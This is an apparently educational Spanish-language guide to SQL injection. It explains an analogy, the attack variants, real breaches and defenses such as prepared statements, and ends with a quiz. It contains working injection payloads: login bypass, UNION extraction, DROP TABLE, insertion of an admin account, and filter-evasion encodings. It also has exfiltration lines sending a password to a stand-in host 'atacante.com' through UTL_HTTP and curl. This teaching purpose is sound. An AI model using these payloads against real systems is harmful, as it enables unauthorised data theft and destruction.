---
title: "Inyección SQL (SQLi): Engañando al Archivero"
---

# Inyección SQL (SQLi): Engañando al Archivero

## Objetivo de esta Guía

Entender la vulnerabilidad web más famosa, antigua y devastadora de la historia. A pesar de tener más de 25 años de antigüedad, la Inyección SQL sigue destruyendo empresas hoy en día.

Ocurre cuando un programador confía ciegamente en lo que el usuario escribe en una caja de texto, permitiendo que el usuario envíe codigo malicioso directamente a la base de datos de la empresa. No importa si tu servidor esta en la nube más cara de AWS o si tu frontend esta hecho con el framework más moderno de JavaScript. Si concatenas texto en una consulta SQL, eres vulnerable.

Esta guía cubre desde los fundamentos más básicos hasta variantes avanzadas como Blind SQLi, Second-Order SQLi, y técnicas de bypass de filtros. No es solo teoría: es la experiencia de haber visto sistemas completos caer por una sola comilla mal filtrada.

## La Base de Datos Relacional y el Lenguaje SQL

Antes de entender el ataque, necesitas entender que es una base de datos relacional. Es un sistema que organiza la información en tablas. Cada tabla tiene filas (registros) y columnas (campos).

Una tabla de usuarios se ve así:

| id | nombre  | email              | contrasena_hash                    | rol    |
|----|---------|-------------------|------------------------------------|--------|
| 1  | Juan    | juan@email.com    | 5e884898da28047151d0e56f8dc62927  | admin  |
| 2  | Maria   | maria@email.com   | 6cb75e6525b4c9f3c63c1e2c8b2a3b4c  | usuario|
| 3  | Pedro   | pedro@email.com   | 9c1134b3c2f8a9e6d1a5b3c4d7e8f9a0  | usuario|

Para interactuar con esta tabla, usamos SQL (Structured Query Language). Una consulta tipica seria:

```sql
SELECT * FROM usuarios WHERE email = 'juan@email.com' AND contrasena_hash = '5e884...'
```

El servidor (Backend) construye esta cadena de texto SQL y se la envía al motor de base de datos. El motor ejecuta la consulta y devuelve los resultados.

El problema: si el programador construye la consulta concatenando directamente el input del usuario, el usuario puede romper la estructura de la consulta agregando sus propios comandos SQL.

## La Analogía: El Archivero Ciego

Imagina que la Base de Datos es un enorme cuarto lleno de archiveros. Dentro del cuarto vive un **Archivero Ciego (El motor SQL)**.

El archivero es una máquina perfecta. Hace exactamente lo que le pides, muy rápido, pero no tiene sentido común. No sabe si lo que le pides tiene sentido lógico o no. Solo ejecuta órdenes.

El lenguaje oficial con el que le das órdenes al archivero se llama **SQL**.

### El Escenario Normal

En tu pagina web tienes una caja de texto para que los clientes busquen productos. Un cliente escribe la palabra `Zapatos`.

El servidor web (El Cocinero) toma la palabra `Zapatos` y construye la siguiente oración lógica en SQL:

```sql
SELECT * FROM productos WHERE nombre = 'Zapatos';
```

El servidor le dice al archivero: "Hola Archivero, por favor ve y búscame todos los productos DONDE el nombre sea IGUAL a 'Zapatos'."

El archivero obedece, saca los expedientes de zapatos y te los da. Todo es feliz y normal.

## El Ataque: Inyección Básica

Un Hacker llega a tu pagina web y, en la caja de búsqueda de productos, en lugar de escribir "Zapatos", escribe lo siguiente exactamente (incluyendo la comilla simple al principio):

```
' OR 1=1 --
```

El Cocinero (Backend) estúpido y mal programado toma este texto y lo pega directamente en la oración. La orden que recibe el Archivero ciego ahora queda así:

```sql
SELECT * FROM productos WHERE nombre = '' OR 1=1 --';
```

### La Descomposición Matemática de la Destrucción

Para el Archivero ciego, esta oración tiene lógica matemática pura:

1. **`''` (Vacio):** El archivero busca un producto sin nombre. No encuentra ninguno. Resultado: Falso.
2. **`OR`:** La palabra mágica. Significa "Si lo primero fue falso, revisa la segunda opción".
3. **`1=1`:** El archivero se pregunta: "El número 1 es igual al número 1?" La respuesta es **Verdadero**.
4. **`--` (Comentario):** Le dice al archivero: "Ignora cualquier otra orden que venga después de esto, no importa."

**El Resultado:** Dado que "1 siempre es igual a 1", la condición es verdadera para absolutamente todos los archivos en todo el cuarto. El Archivero ciego saca **toda la base de datos** (incluyendo cuentas de usuarios, tarjetas de crédito, precios ocultos) y los escupe en la pantalla del atacante.

El hacker acaba de robarte la empresa entera usando una comilla simple y matemática de primaria.

## Bypass de Autenticación (Authentication Bypass)

Una variante común de SQLi es el bypass de login. En lugar de buscar productos, el atacante intenta iniciar sesión como administrador sin conocer la contraseña.

**Formulario de login normal:**
El servidor construye esta consulta:

```sql
SELECT * FROM usuarios WHERE usuario = 'admin' AND contrasena = 'secreta';
```

Si la consulta devuelve al menos un registro, el servidor permite el acceso.

**El ataque:**
El atacante escribe en el campo de usuario:

```
admin' --
```

Y en contrasena escribe cualquier cosa.

La consulta se convierte en:

```sql
SELECT * FROM usuarios WHERE usuario = 'admin' --' AND contrasena = 'cualquier_cosa';
```

El `--` comenta el resto de la consulta. El servidor busca al usuario `admin` sin verificar la contraseña. Si el usuario `admin` existe, el ataque funciona.

**Variante más destructiva:**

El atacante escribe en el campo de usuario:

```
' OR 1=1 --
```

La consulta se convierte en:

```sql
SELECT * FROM usuarios WHERE usuario = '' OR 1=1 --' AND contrasena = 'cualquier_cosa';
```

Esto devuelve TODOS los usuarios registrados. El servidor tipicamente toma el primer resultado (que podría ser un administrador). El atacante entra sin conocer ninguna credencial.

## Tipos de Inyección SQL

### Inyección SQL en el Parámetro GET

Ocurre cuando los datos se pasan a través de la URL. Por ejemplo:

```
https://tienda.com/producto.php?id=5
```

El servidor construye: `SELECT * FROM productos WHERE id = 5;`

El atacante modifica la URL:

```
https://tienda.com/producto.php?id=5 UNION SELECT usuario, contrasena FROM admins
```

Si el servidor no valida que el parámetro `id` sea un número entero, la consulta inyectada se ejecuta.

### Inyección SQL en POST

Ocurre en formularios que usan el método POST. Los datos no son visibles en la URL pero el atacante puede interceptarlos con Burp Suite y modificarlos antes de que lleguen al servidor.

### Blind SQLi (Inyección Ciega)

No todas las aplicaciones muestran los resultados de la base de datos en la pantalla. Pero aún así puedes extraer información haciendo preguntas de "si o no".

**Blind SQLi Basado en Booleanos:**
El atacante envía una condición que siempre es verdadera y observa si la respuesta es diferente a cuando envía una condición falsa.

```
' AND 1=1 --  (Pagina normal)
' AND 1=2 --  (Pagina diferente o error)
```

Si la pagina se comporta diferente, el atacante sabe que puede inyectar. Luego puede hacer preguntas como:

```
' AND (SELECT SUBSTRING(contrasena,1,1) FROM usuarios WHERE id=1) = 'a' --
```

Si la pagina carga normal, la primera letra de la contraseña del administrador es 'a'. Si no, prueba con 'b', 'c', etc. El atacante adivina la contraseña letra por letra.

Esto es lento pero completamente automatizable. Herramientas como SQLMap hacen esto en segundos.

**Blind SQLi Basado en Tiempo:**
Cuando no hay diferencias visibles entre respuestas verdaderas y falsas, el atacante usa retardos de tiempo:

```
' AND IF(1=1, SLEEP(5), 0) --
```

Si la pagina tarda 5 segundos en cargar, la condición era verdadera. El atacante puede extraer datos usando preguntas que condicionan el retardo.

### Second-Order SQLi (Inyección SQL de Segundo Orden)

Es más sutil. El atacante inyecta codigo SQL en un campo que se almacena en la base de datos (como el nombre de usuario al registrarse). En el momento del registro, el codigo no se ejecuta porque la consulta INSERT usa consultas preparadas.

Pero cuando otra funcion del sistema recupera ese nombre de usuario y lo usa en una consulta SQL (tal vez concatenandolo), el codigo inyectado se activa.

**Ejemplo:**
1. El atacante se registra con el nombre: `Roberto'; DROP TABLE usuarios; --`
2. El sistema guarda el nombre en la base de datos usando consultas preparadas. No hay problema ahí.
3. Dias después, un administrador ejecuta un reporte que dice: "Mostrar pedidos del usuario: " + nombreUsuario.
4. La consulta concatenada ejecuta el DROP TABLE y destruye la tabla de usuarios.

### Out-of-Band SQLi

Cuando el atacante no puede recibir los resultados directamente en la respuesta HTTP, pero el servidor puede hacer peticiones a otros sistemas (como DNS o HTTP). El atacante usa funciones de base de datos que hacen peticiones externas para enviar los datos robados a un servidor controlado por el atacante.

Ejemplo en Oracle (funcion UTL_HTTP):
```
' AND UTL_HTTP.request('http://atacante.com/robo?dato=' || (SELECT contrasena FROM usuarios WHERE id=1)) --
```

## Extracción de Datos con UNION

La clausula UNION permite combinar resultados de dos consultas en una sola respuesta. El atacante la usa para agregar datos de otras tablas a la respuesta del servidor.

**Paso 1: Determinar cuántas columnas tiene la consulta original.**

El atacante prueba con:
```
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
' ORDER BY 4 -- (Error: la consulta original solo tiene 3 columnas)
```

O con UNION:
```
' UNION SELECT NULL --
' UNION SELECT NULL, NULL --
' UNION SELECT NULL, NULL, NULL -- (Funciona: 3 columnas)
```

**Paso 2: Encontrar que columnas muestran información en la pagina.**

```
' UNION SELECT 1, 2, 3 --
```

Si el número 2 aparece en la pagina, la columna 2 se puede usar para mostrar datos extraidos.

**Paso 3: Extraer datos de otras tablas.**

```
' UNION SELECT 1, usuario, contrasena FROM admins --
```

Ahora los nombres de usuario y contraseñas de la tabla `admins` aparecen en la pagina.

## Comandos Destructivos

SQLi no solo sirve para leer datos. También permite modificarlos o destruirlos.

**INSERT:** El atacante puede insertar un nuevo usuario administrador.

```
' ; INSERT INTO usuarios (usuario, contrasena, rol) VALUES ('hacker', '123456', 'admin') --
```

**UPDATE:** Puede modificar datos existentes.

```
' ; UPDATE usuarios SET contrasena = 'nueva' WHERE id = 1 --
```

**DELETE / DROP:** Destrucción.

```
' ; DROP TABLE usuarios --
```

`DROP TABLE` borra toda la tabla incluyendo su estructura. `DELETE FROM usuarios` borra todos los registros pero mantiene la tabla.

## Bypass de Filtros (Evasión de Defensas)

Los programadores a veces intentan filtrar palabras clave peligrosas. Los atacantes tienen técnicas para evadir estos filtros.

**Filtro: "Bloquear comilla simple"**

El atacante usa:
- Codificación URL: `%27` en lugar de `'`
- Unicode: `\u0027` en lugar de `'`
- Comillas dobles si la base de datos las acepta
- Sin comillas si puede convertir a entero

**Filtro: "Bloquear la palabra OR"**

El atacante usa:
- `||` en lugar de `OR` (en algunas bases de datos)
- `OORR` (si el filtro es ingenuo y elimina OR, queda OR)
- Variantes como `1=1` puede ser `2=2` o `'a'='a'`

**Filtro: "Bloquear UNION"**

En MySQL: `UNION` puede escribirse como `UNION ALL`, `UN/**/ION` (comentarios internos).

**Filtro: "Bloquear espacios"**

El atacante usa tabuladores, saltos de línea o comentarios: `'/**/OR/**/1=1/**/--`

**Filtro: "Bloquear comentarios"**

En MySQL se puede usar `#` en lugar de `--`. O simplemente cerrar la consulta correctamente:

```
' OR '1'='1
```

**Stacked Queries (Consultas Apiladas):** Algunas bases de datos permiten múltiples consultas separadas por punto y coma (`;`). En PostgreSQL y SQL Server, el atacante puede ejecutar comandos del sistema operativo usando funciones como `xp_cmdshell` (SQL Server) o `COPY` (PostgreSQL).

## Tipos de Base de Datos y Diferencias

Cada motor de base de datos tiene sus propias funciones y sintaxis. Un atacante adapta la inyección según la base de datos que detecta.

**MySQL/MariaDB:**
- Comentarios: `-- `, `#`, `/* */`
- Funcion de versión: `VERSION()`
- Base de datos actual: `DATABASE()`
- Usuario actual: `USER()`
- Concatenacion: `CONCAT(columna1, columna2)`

**PostgreSQL:**
- Comentarios: `-- `
- Funcion de versión: `VERSION()`
- Base de datos actual: `CURRENT_DATABASE()`
- Stacked queries: `SELECT 1; SELECT 2`
- Envio de peticiones: `COPY (SELECT 'dato') TO PROGRAM 'curl http://atacante.com/'`

**SQL Server:**
- Comentarios: `-- `, `/* */`
- Concatenacion: `columna1 + columna2`
- Comandos del sistema: `xp_cmdshell('comando')`
- Stacked queries: `SELECT 1; SELECT 2`

**Oracle:**
- Comentarios: `-- `
- Tabla especial: `FROM dual` (siempre existe)
- Funciones: `UTL_HTTP.request()` para peticiones externas
- Concatenacion: `columna1 || columna2`

## Casos Reales de SQLi

**Caso Heartland Payment Systems (2008):** Un atacante exploto una SQL Injection en los sistemas de procesamiento de pagos de Heartland. Más de 130 millones de tarjetas de crédito fueron comprometidas. La empresa pago más de $140 millones en multas y compensaciones. El atacante, Albert Gonzalez, fue condenado a 20 años de prisión.

**Caso Sony Pictures (2011):** SQL Injection en los servidores de Sony permitió a atacantes robar datos de 77 millones de usuarios de PlayStation Network. El servicio estuvo caído 23 dias. El costo total superó los $170 millones.

**Caso Yahoo (2012):** Un atacante uso SQL Injection para robar 450,000 nombres de usuario y contraseñas de Yahoo Voices. Las contraseñas estaban almacenadas en texto plano.

**Caso Adult Friend Finder (2016):** SQL Injection expuso 412 millones de cuentas. Las contraseñas estaban hasheadas con SHA1, que es débil y fácil de descifrar.

**Caso British Airways (2018):** No fue SQLi pero es importante mencionar: el ataque fue XSS (inyección de JavaScript en el formulario de pago). Muestra que la "Inyección" como categoría (A03) no se limita a SQL.

## La Defensa: Como Prevenir SQLi

La defensa contra SQLi es una de las más fáciles de implementar en la seguridad web, ironicamente. No requiere magia ni herramientas costosas. Requiere disciplina.

### La Regla de Oro: Consultas Parametrizadas (Prepared Statements)

NUNCA concatenes texto para construir consultas SQL. Usa consultas parametrizadas.

**Mal (Concatenacion - VULNERABLE):**

```php
$query = "SELECT * FROM usuarios WHERE usuario = '" . $_POST['usuario'] . "'";
```

**Bien (Prepared Statement - SEGURO):**

```php
$stmt = $pdo->prepare("SELECT * FROM usuarios WHERE usuario = :usuario");
$stmt->execute(['usuario' => $_POST['usuario']]);
```

Con prepared statements, el input del usuario se trata como datos, no como codigo SQL. La base de datos sabe que el valor de `:usuario` es un string literal, sin importar que contenga comillas, guiones o comandos SQL.

### Defensa en Profundidad

Además de prepared statements, implementa:

1. **Validación de tipo:** Si esperas un número, verifica que sea numérico antes de pasarlo a la consulta.
2. **Principio de mínimo privilegio:** La cuenta de base de datos que usa la aplicación web solo debe tener los permisos minimos necesarios. Si la aplicación solo necesita SELECT, no le des permisos DROP o DELETE.
3. **Escapado de caracteres (solo como respaldo):** Funciones como `mysqli_real_escape_string()` en PHP. No es tan seguro como prepared statements pero es mejor que nada.
4. **WAF (Web Application Firewall):** Herramientas como ModSecurity o AWS WAF pueden detectar y bloquear patrones de SQLi antes de que lleguen al servidor. No confíes solo en esto pero es una buena capa adicional.

### Detección de SQLi en el Codigo (SAST)

Las herramientas SAST (Static Application Security Testing) como SonarQube, Checkmarx o Snyk pueden detectar concatenacion de strings en consultas SQL automáticamente. Si tu pipeline CI/CD tiene un paso SAST que falla cuando detecta concatenacion SQL, el error nunca llega a producción.

**Aprende más en:** FUNDAMENTOS-APPSEC.md.

### Detección de SQLi en Tiempo Real (WAF/IDS)

Un Web Application Firewall (WAF) o Sistema de Detección de Intrusiones (IDS) puede detectar patrones de SQLi en el tráfico HTTP. Buscan palabras clave como `OR 1=1`, `UNION SELECT`, `--`, `DROP TABLE`, etc.

**Limitacion:** Los atacantes evaden WAFs con técnicas de bypass. Por eso el WAF nunca debe ser tu única defensa.

## Modos de Falla con SQLi

**Confiar solo en la validación del Frontend.** Si el formulario valida que el campo sea solo números pero el Backend no lo verifica, el atacante bypasea la validación frontend con Burp Suite.

**Usar un ORM y asumir que es inmune.** Los ORMs (Object-Relational Mapping) como Hibernate, Entity Framework, o Eloquent usan consultas parametrizadas internamente... a menos que uses "raw queries" o "native queries" que concatenan strings.

**Filtrar palabras clave con blacklists.** Los atacantes evaden filtros con técnicas de encoding, comentarios internos, y variantes sintacticas. La única defensa real es prepared statements.

**Creer que "escapar" es suficiente.** Funciones como `mysql_escape_string()` tienen bugs conocidos y no cubren todos los casos. Además, se te puede olvidar escapar un campo, o escapar dos veces.

## Autoevaluación

1. Estas auditando una pagina web y escribes una comilla simple (`'`) en la caja de búsqueda. La pagina se rompe y te devuelve un mensaje rojo gigantesco que dice: `Error Code 1064: You have an error in your SQL syntax near...`. Por que ese mensaje es información valiosa para un Penetration Tester?

2. Un programador te dice: "Yo no sufro de SQL Injection porque programé un filtro que elimina todas las comillas simples de lo que escribe el usuario." Por que los filtros manuales (Blacklisting) suelen ser una mala idea comparado con usar Consultas Preparadas?

3. Si un hacker quiere destruir la empresa de forma vengativa, que comando de inyección clásico (DROP) podría intentar insertar para borrar una tabla entera?

4. En un ataque de Authentication Bypass (burlar el login), por que `' OR 1=1 --` logra engañar a la base de datos para dejar entrar al atacante sin contrasena?

5. Explica la diferencia práctica entre SQLi clásica (donde ves los resultados en pantalla) y Blind SQLi basada en tiempo. Cuando usarías cada una?

6. Un desarrollador usa un ORM moderno (como Entity Framework o Eloquent) para todas las consultas, pero en un modulo de reportes usa "raw SQL" porque "es más fácil y solo lo usa el administrador". Por que esta decisión crea un riesgo de SQL Injection de Segundo Orden?

7. Durante un pentest, encuentras que el parámetro `id` en la URL `producto.php?id=5` es vulnerable a SQLi. Sin embargo, cuando intentas `' OR 1=1 --`, el servidor devuelve un error 500. Cuando pruebas `' OR 1=2 --`, también devuelve error 500. Como determinas si realmente hay SQLi o es un falso positivo?

8. Un equipo de seguridad implementa un WAF que bloquea peticiones que contengan " UNION SELECT ". Explica dos técnicas que un atacante podría usar para evadir este filtro.
